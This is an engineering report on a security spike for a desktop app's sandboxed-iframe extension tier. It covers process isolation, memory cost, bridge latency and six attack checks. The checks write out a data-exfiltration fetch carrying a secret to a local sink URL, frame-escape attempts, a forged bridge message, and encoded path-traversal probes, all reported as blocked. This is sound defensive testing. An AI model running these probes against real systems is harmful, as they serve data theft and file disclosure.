# Sandboxed extension iframe spike (T-015)

- **Date:** 2026-10-22
- **Status:** complete, all attack checks blocked
- **Implementation:** commit `a9a0520` on `t015-extension-sandbox-spike`
- **Scope:** evidence for the T1 sandboxed tier in [extension system §7.1, §7.10, §7.11](../architecture/extension-system.md). The spike code is disposable and is not a product feature.
- **Raw evidence:** `/tmp/opencode/t015/report3.json` (primary) and `report4.json` (repeat). Not committed; they contain machine paths.

## Question

Does a third-party view in a `<iframe sandbox="allow-scripts">` without `allow-same-origin`, served from a privileged scheme with `default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'none'`, and talking to the host only through a versioned `postMessage` bridge:

1. get its own renderer process, separate from the host window;
2. cost an acceptable amount of memory per view;
3. answer bridge calls fast enough for interactive UI;
4. resist the six listed attacks without any extra sandboxing layers?

This document records what was measured and what was not.

## Setup

| Piece | What the spike used |
| --- | --- |
| Host | Electron 44.7.0, Chromium 152.0.7977.130, Node 24.21.0, Linux x64, 11th Gen Intel i5-11300H, 8 logical CPUs, 23,299 MiB RAM |
| Scheme | `mortise-ext`, registered with `standard: true`, `secure: true`, `supportFetchAPI: true`, `stream: true`, `corsEnabled: false`, `bypassCSP: false` |
| Package origin | `mortise-ext://acme.tasks/`, only the host `acme.tasks` is served |
| CSP header | `default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'none'`, sent on every response including 404 and 403 |
| Frame | `<iframe sandbox="allow-scripts" src="mortise-ext://acme.tasks/view/index.html">`, no `allow-same-origin` |
| Host window | `sandbox: true`, `contextIsolation: true`, `nodeIntegration: false`, the same sandboxed preload as the product window; `backgroundThrottling: false` only for stable timers |
| Bridge | `mortise-extension-rpc` v1, calls limited to `commands.register`, `notify`, `network.fetch`; host validates `event.source` identity, direction, version, kind, call and params |
| Tool renderer | Manifest entry `match: "mcp.acme.*"`, `title: "{input.id}"`, `body: "table"`, columns `id,title,status`; rendered by host DOM code |

The spike host page is dev-only and is built only with `MORTISE_SPIKE_BUILD=1`. It carries its own `frame-src mortise-ext://acme.tasks`; the production renderer's CSP was not widened. §7.10 notes that a real host page needs that narrow `frame-src` allowance before Phase 3.

The sample extension is a plain HTML/CSS/JS view. It requests no capability. `network.fetch` is always denied by the host because the extension has no `network` capability; the host never performs the request.

## Measurement method

All measurements come from programmatic runs of the built app, not from manual inspection. The primary run and one repeat are both reported.

- **Process identity:** `BrowserWindow.webContents.mainFrame.osProcessId` for the host; `WebFrameMain.osProcessId` and `WebFrameMain.processId` for each extension frame. `processId` is Chromium's internal id, not the OS pid, so both are recorded. `app.getAppMetrics()` supplies the OS-process rows.
- **Memory:** `app.getAppMetrics()` → `memory.workingSetSize`, in kilobytes. Extension processes are identified by the `osProcessId` values of the extension frames. After each frame count changed, the driver waited 1,200 ms, then took three samples 500 ms apart and used the last one. No garbage collection was forced.
- **Latency:** the extension view performs 50 warmup `notify` calls, then 1,000 sequential calls, each timed with `performance.now()` around one full round trip: extension frame → host renderer → extension frame. Awaiting the previous response before starting the next makes this a request/response latency, not a throughput test.
- **Attack checks:** each attempted once from inside the extension frame (or through `net.fetch` for the scheme handler) and recorded with the browser error, console line, URL state or HTTP status that proves the outcome.

## 1. Process isolation

Primary run:

| Frames | Host renderer OS pid | Extension frame OS pids | Chromium process ids | Separate from host? |
| --- | --- | --- | --- | --- |
| 0 | 905959 | none | host 4 | — |
| 1 | 905959 | 906141 | host 4, frame 5 | yes |
| 5 | 905959 | 906141 (all five) | host 4, frame 5 | yes |
| 10 | 905959 | 906141 (all ten) | host 4, frame 5 | yes |

**Result: yes.** The sandboxed `mortise-ext://` frame runs in a renderer process separate from the host window's renderer. Ten frames from the same extension origin shared one extension process; they did not each get a process.

This answers the open question in §7.10 for one extension. It does not prove cross-extension separation: all frames here had the same scheme host. Two different extension ids (`mortise-ext://a/`, `mortise-ext://b/`) are different sites and should get different site instances, but that was not measured. Treat extension-to-extension process isolation as unproven until a second-id run exists.

## 2. Memory

Primary run, all sizes in KiB (`workingSetSize`):

| Frames | Extension process | Host renderer | All Tab processes | All app processes | Marginal per added frame |
| --- | ---: | ---: | ---: | ---: | ---: |
| 0 | 0 | 112,076 | 112,076 | 636,000 | — |
| 1 | 108,560 | 115,592 | 224,152 | 750,648 | 108,560 (106.0 MiB) for the first frame |
| 5 | 112,868 | 117,228 | 230,096 | 761,396 | 1,077 per frame for frames 2–5 |
| 10 | 119,012 | 120,160 | 239,172 | 775,780 | 1,228.8 per frame for frames 6–10 |

Repeat run:

| Frames | Extension process | Marginal per added frame |
| --- | ---: | ---: |
| 1 | 108,060 | 108,060 (105.5 MiB) for the first frame |
| 5 | 114,156 | 1,524 per frame for frames 2–5 |
| 10 | 119,064 | 981.6 per frame for frames 6–10 |

Reading the numbers:

- The first frame pays for a new renderer process: about **106 MiB** of working set.
- Each additional frame in the same extension process costs about **1.0–1.5 MiB**. The two runs differ by roughly ±0.5 MiB per frame, which is expected for OS working-set samples.
- The host renderer's working set rises from 112,076 KiB to 120,160 KiB across ten frames, about 7.9 MiB more. That is the host holding ten iframe elements and bridge bookkeeping, not the extension's memory.
- `workingSetSize` is an OS-level figure that includes shared pages and code; it is not a JavaScript heap measurement and should not be compared with a `process.memoryUsage()` number. No GC was forced.
- Four extra frames added 4.2 MiB in the primary run and 6.0 MiB in the repeat; ten frames added about 10.2–10.5 MiB over the first frame. The fixed process cost dominates until a view count is large.

## 3. Bridge latency

| Run | Calls | Warmup | Min | Mean | Median | p95 | p99 | Max |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | ---: |
| Primary | 1,000 | 50 | 0.0 ms | 0.2121 ms | 0.2 ms | 0.3 ms | 0.4 ms | 4.1 ms |
| Repeat | 1,000 | 50 | 0.0 ms | 0.2211 ms | 0.2 ms | 0.3 ms | 0.5 ms | 4.5 ms |

`0.0 ms` means the sample rounded below the timer's displayed resolution, not that it took zero time. The slowest call in each run (4.1 and 4.5 ms) is consistent with a scheduler hiccup, not a queue.

This is the transport cost only. A real capability call such as `sessions.current()` adds a hop from the host renderer to the main process and back, plus the handler's work. The spike cannot claim that end-to-end latency from this number.

## 4. Bridge surface and tool renderer

- `commands.register` returned `{ registered: true }` and the host recorded `acme.tasks.sync`.
- `notify` returned `{ shown: true }`. By the forged-message check the host had accepted 1,071 calls: ten frames' `commands.register` and ready notifications, 50 warmup calls, 1,000 measured calls and one `network.fetch`.
- `network.fetch` returned `{ code: "capability_denied", message: "network capability is not granted" }`. The host never called `fetch`.
- A forged `host-to-extension` request posted by the extension frame was **not** executed: accepted calls stayed at 1071, the `wrong-direction` rejection count went from 0 to 1, and the forged notification never appeared in the host log.
- The declarative tool-call renderer matched `mcp.acme.*` from the sample manifest, substituted `{input.id}` and rendered one table row from `{ id, title, status }`. No extension code was involved; unit tests cover the matcher and template.

## 5. Attack checks

| # | Check | Attempt | Outcome | Evidence |
| --- | --- | --- | --- | --- |
| 1 | `fetch` to a remote URL | Frame fetched `http://127.0.0.1:45299/exfil?secret=spike`; a local HTTP sink counted requests | **blocked** | `TypeError: Failed to fetch`; sink hits `[]`; console: `Connecting to 'http://127.0.0.1:45299/exfil?secret=spike' violates ... "connect-src 'none'"` and `Refused to connect because it violates the document's Content Security Policy` |
| 2 | Read `parent.document` | Frame read `parent.document.body.innerHTML` | **blocked** | `SecurityError: Failed to read a named property 'document' from 'Window': Blocked a frame with origin "null" from accessing a cross-origin frame` |
| 3 | Navigate `top.location` | Frame set `top.location.href = "https://example.com/mortise-spike"` | **blocked** | `SecurityError` on assignment; top URL and frame URL unchanged after 750 ms; console: `The frame attempting navigation of the top-level window is sandboxed, but the flag of 'allow-top-navigation' ... is not set` |
| 4 | `window.open` | Frame called `window.open("https://example.com/mortise-spike", "_blank")` | **blocked** | Returned `null`; `BrowserWindow` count stayed 1; console: `Blocked opening ... because the request was made in a sandboxed frame whose 'allow-popups' permission is not set` |
| 5 | Forged host message | Frame posted a request with `direction: "host-to-extension"` and a `notify` body | **blocked** | Accepted calls unchanged (1071 → 1071); `wrong-direction` rejections 0 → 1; forged notification not delivered. `event.source` identity is the primary control; the direction check is the second |
| 6 | Path traversal against the scheme handler | Main called `net.fetch` for encoded `../`, absolute, double-encoded, normalized and wrong-host URLs | **blocked** | See the table below; the canary outside the package root was never returned |

Path traversal probes, primary run:

| Probe | Status | Canary content read? |
| --- | ---: | --- |
| `mortise-ext://acme.tasks/package.json` (baseline inside the root) | 200 | no |
| `%2e%2e%2f` × 10 to `/tmp/mortise-spike-canary-905903.txt` | 403 | no |
| Encoded absolute `%2ftmp%2fmortise-spike-canary-905903.txt` | 404 | no |
| Double-encoded `%252e%252e%252f...` | 404 | no |
| `%2e%2e/package.json` (URL normalizes before the handler) | 200 | no; resolves to `/package.json`, still inside the root |
| `mortise-ext://other.tasks/package.json` | 404 | no |

The handler decodes once, resolves the path under the package root, rejects a pre-resolution escape, follows the real path to catch symlinks, and rejects a real path outside the root. Vitest covers the handler with a real temporary directory: traversal returns 403, a symlink pointing outside returns 403, malformed encoding and null bytes return 400, and a wrong host returns 404.

No attack check succeeded, so the run continued through the full memory table. The driver would have stopped and written a non-zero-exit report at the first success.

## What the numbers mean for the design

**Use sandboxed iframes for T1 views.** The measured evidence supports the default already in §7.11:

- Host isolation is real: the extension renderer is a different OS process from the host. A renderer compromise in the extension process does not get direct access to the host renderer's memory or DOM; the bridge and CSP still apply.
- Cost is dominated by one process per extension origin: about **106 MiB** for the first frame, then **1.0–1.5 MiB** per extra view in the same extension. Ten views of one extension cost about **116 MiB** of extension working set, not ten processes.
- The bridge is fast enough for interactive UI at **0.2 ms median and 0.3–0.4 ms p95** for a renderer-to-renderer round trip. A real call that reaches main will be slower, but this leaves ample budget.
- Layout is ordinary HTML: the host composes, sizes and clips frames with CSS. There is no native view to position, z-order, theme or destroy.

**Do not switch to `WebContentsView` for host isolation.** The measured iframe already separates the host from the extension. A `WebContentsView` per extension costs another renderer process with similar fixed memory, plus bounds management, native-view z-order and a separate IPC path. It would not improve the host boundary that this spike was testing.

**Keep `WebContentsView` as the fallback for two cases:**

1. **Cross-extension isolation**, if a follow-up with two extension ids shows that different origins share one renderer process. A compromised extension could then read another extension's frame, and a process per extension or a native view per extension would be justified.
2. **Web embeds or surfaces that need a real browser view** rather than a document in the host layout.

**One extension process per origin is the thing to watch.** The ten-frame result is good news for multiple views of one extension and a warning for a design that assumes every extension gets its own process. Two extension ids were not measured. Until they are, do not claim extension-to-extension process isolation.

**The bridge must trust `event.source`, not `event.origin`.** A sandboxed iframe serializes its origin as `"null"`. A payload field or a token in the message is attacker-controlled; `event.source` identity and the envelope direction/version are the controls that worked.

## Architecture and ADR changes

- **§7.10 open question resolved.** The measured result replaces it: opaque-origin `mortise-ext://` frames are in a renderer process separate from the host. The `WebContentsView` fallback is not needed for host isolation.
- **§7.10 adds two implementation notes:** the host page must allow the extension origin in `frame-src` (narrowly, not by widening `script-src` or `connect-src`), and the bridge must authenticate by `event.source` identity.
- **§7.11** gains the measured cost for the sandboxed-iframe row so the comparison against `WebContentsView` is not purely qualitative.
- **No new ADR is required.** ADR-0009 already chose sandboxed iframes as the second tier; this spike validates that choice. If the maintainer wants the performance envelope recorded as a decision rather than evidence, a short ADR-0015 could point at this document, but it would not change the decision.

## Limitations

- One machine, one display, no usable GPU acceleration (the run logged `vaInitialize failed`). Memory and latency will differ on other hardware.
- Two runs, one extension origin. Cross-extension process sharing was not measured.
- `workingSetSize` includes shared pages and OS cache; it is not a heap measurement. No forced GC, and the samples move by a few hundred KiB between runs.
- The latency number is renderer-to-renderer `postMessage`. It excludes the main-process hop and capability-handler work that a real API call needs.
- The attack checks are attempts from inside the frame, not a Chromium exploit or a compromised renderer. They test the sandbox boundary and the bridge, not the browser's own vulnerability surface.
- The host was a dedicated dev-only spike page, not the workbench shell. It used the same `webPreferences` (`sandbox`, `contextIsolation`, no Node) but its `frame-src` allowance lives in that page. The production renderer CSP is unchanged.
- The manifest was imported statically by the host page. Manifest discovery, install, capability approval and update are Phase 3 and out of scope.
- The spike window used `backgroundThrottling: false` so timers were not throttled by window occlusion. A background window would produce worse latency numbers.

## Reproduction

```bash
# Build the normal app plus the dev-only spike page.
MORTISE_SPIKE_BUILD=1 bun run build

# Run the spike in its own userData directory; it exits when the report is written.
MORTISE_SPIKE=extension-sandbox \
MORTISE_SPIKE_OUT=/tmp/opencode/t015/report.json \
MORTISE_SPIKE_USER_DATA=/tmp/opencode/t015/userdata \
apps/desktop/node_modules/.bin/electron apps/desktop
```

The report is JSON. An attack that succeeds exits with code 2 and records `attackFailure`; an incomplete run exits with code 1.

```bash
bun run check
```

Result at the implementation commit: lint, typecheck, dependency rules and the full Vitest suite pass (34 files passed, 3 skipped; 227 tests passed, 8 skipped). The spike adds 13 unit tests for the envelope, the scheme handler and the declarative tool renderer.
